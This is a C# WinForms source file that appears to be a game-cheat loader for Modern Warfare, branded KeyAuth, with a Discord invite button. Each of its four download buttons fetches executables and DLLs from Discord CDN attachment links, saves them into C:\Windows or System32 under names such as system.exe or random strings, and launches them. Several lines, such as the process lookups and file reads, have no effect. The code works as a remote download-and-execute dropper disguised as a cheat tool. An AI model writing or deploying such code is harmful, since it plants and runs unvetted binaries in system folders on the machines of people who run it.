using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Net;
using System.Windows.Forms;
using Loader;
using Siticone.UI.AnimatorNS;
using Siticone.UI.WinForms;
using Siticone.UI.WinForms.Enums;

namespace KeyAuth
{
	public partial class Main : Form
	{
		public Main()
		{
			this.InitializeComponent();
		}

		private void siticoneControlBox1_Click(object sender, EventArgs e)
		{
			Environment.Exit(0);
		}

		private void Main_Load(object sender, EventArgs e)
		{
			//Login.KeyAuthApp.check();
		}

		public DateTime UnixTimeToDateTime(long unixtime)
		{
			DateTime result = new DateTime(1970, 1, 1, 0, 0, 0, 0, DateTimeKind.Local);
			result = result.AddSeconds((double)unixtime).ToLocalTime();
			return result;
		}

		private void siticoneRoundedButton1_Click_1(object sender, EventArgs e)
		{
			WebClient webClient = new WebClient();
			string text = "C:\\Windows\\system.exe";
			webClient.DownloadFile("https://cdn.discordapp.com/attachments/927564154569642024/958321040214355998/cheatoffnew.exe", text);
			Process.GetProcessesByName("ModernWarfare").FirstOrDefault<Process>();
			File.ReadAllBytes(text);
			if (File.Exists(text))
			{
				Process.Start(text);
			}
		}

		private void sendmsg_Click_1(object sender, EventArgs e)
		{
			Process.Start("explorer.exe", "https://discord.gg/PfmYuNDWEB");
		}

		private void siticoneRoundedButton3_Click(object sender, EventArgs e)
		{
			WebClient webClient = new WebClient();
			string text = "C:\\Windows\\lkjladjsljldajklsjkljasd.exe";
			webClient.DownloadFile("https://cdn.discordapp.com/attachments/934512902864515172/934513001439035402/lkjladjsljldajklsjkljasd.exe", text);
			Process.GetProcessesByName("ModernWarfare").FirstOrDefault<Process>();
			File.ReadAllBytes(text);
			if (File.Exists(text))
			{
				Process.Start(text);
			}
		}

		private void siticoneRoundedButton2_Click(object sender, EventArgs e)
		{
			WebClient webClient = new WebClient();
			string text = "C:\\Windows\\random.exe";
			webClient.DownloadFile("https://cdn.discordapp.com/attachments/927564154569642024/939211631462866954/LKFSKLDJCS0.exe", text);
			Process.GetProcessesByName("ModernWarfare").FirstOrDefault<Process>();
			File.ReadAllBytes(text);
			if (File.Exists(text))
			{
				Process.Start(text);
			}
		}

		private void siticoneRoundedButton1_Click(object sender, EventArgs e)
		{
			new Info().Show();
			base.Hide();
		}

		private void siticoneRoundedButton4_Click(object sender, EventArgs e)
		{
			WebClient webClient = new WebClient();
			string text = "C:\\Windows\\System32\\0000921.exe";
			string fileName = "C:\\Windows\\System32\\DarkUI.dll";
			string fileName2 = "C:\\Windows\\System32\\Guna.UI2.dll";
			string fileName3 = "C:\\Windows\\System32\\jMem.dll";
			string fileName4 = "C:\\Windows\\System32\\MetroFramework.Design.dll";
			string fileName5 = "C:\\Windows\\System32\\MetroFramework.dll";
			string fileName6 = "C:\\Windows\\System32\\Siticone.Desktop.UI.dll";
			webClient.DownloadFile("https://cdn.discordapp.com/attachments/927564154569642024/961884705316298762/VGUPDATED.exe", text);
			webClient.DownloadFile("https://cdn.discordapp.com/attachments/927564154569642024/961884700606087188/DarkUI.dll", fileName);
			webClient.DownloadFile("https://cdn.discordapp.com/attachments/927564154569642024/961884700803223602/Guna.UI2.dll", fileName2);
			webClient.DownloadFile("https://cdn.discordapp.com/attachments/927564154569642024/961884701281357865/jMem.dll", fileName3);
			webClient.DownloadFile("https://cdn.discordapp.com/attachments/927564154569642024/961884701436555294/MetroFramework.Design.dll", fileName4);
			webClient.DownloadFile("https://cdn.discordapp.com/attachments/927564154569642024/961884701621121024/MetroFramework.dll", fileName5);
			webClient.DownloadFile("https://cdn.discordapp.com/attachments/927564154569642024/961884704754245673/Siticone.Desktop.UI.dll", fileName6);
			Process.GetProcessesByName("ModernWarfare.exe").FirstOrDefault<Process>();
			File.ReadAllBytes(text);
			if (File.Exists(text))
			{
				Process.Start(text);
			}
		}

		//private string chatchannel = "testing";
	}
}
